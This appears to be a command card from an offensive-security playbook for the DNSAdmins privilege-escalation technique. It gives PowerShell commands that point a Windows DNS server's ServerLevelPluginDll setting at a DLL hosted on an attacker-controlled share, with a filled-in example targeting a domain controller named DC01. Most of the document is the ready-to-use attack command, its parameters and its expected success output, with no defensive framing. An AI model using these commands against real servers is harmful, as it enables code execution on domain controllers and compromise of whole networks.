---
id: 4de4020d-a4cc-4afc-8211-0c9dc23969c2
name: Set-DNSServer-Plugin-DLL
type: command
executor: powershell
data: >-
  $dnsettings.ServerLevelPluginDll = "\\attacker_IP\dll\mimilib.dll";
  Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername>
  -Verbose
output: null
created_at: '2023-04-06T03:56:06.475008+00:00'
updated_at: '2023-10-10T20:26:10.325254+00:00'
platforms:
  - Windows
tags:
  - dns
  - hijacking
verified: true
validated: true
---

# Set-DNSServer-Plugin-DLL

## Command

```powershell
$dnsettings.ServerLevelPluginDll = "\\attacker_IP\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
```

## Description

Modifies the DNS settings object and applies the change to set a malicious plugin DLL path using the DNSServer module.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $dnsettings | Settings object from Get-DnsServerSetting | Yes |
| ServerLevelPluginDll | UNC path to DLL | Yes |
| -InputObject | Settings to apply | Yes |
| -ComputerName | Target server | Yes |
| -Verbose | Detailed output | No |

## Examples

### Basic Usage

```powershell
$dnsettings.ServerLevelPluginDll = "\\10.10.10.10\dll\privesc.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName DC01 -Verbose
```

## Expected Output

```
Success: The setting was updated.
```

Confirmation of applied changes.

## Related

- [[procedures/Abuse-DNSAdmins-for-DLL-Hijacking-Privilege-Escalation]]
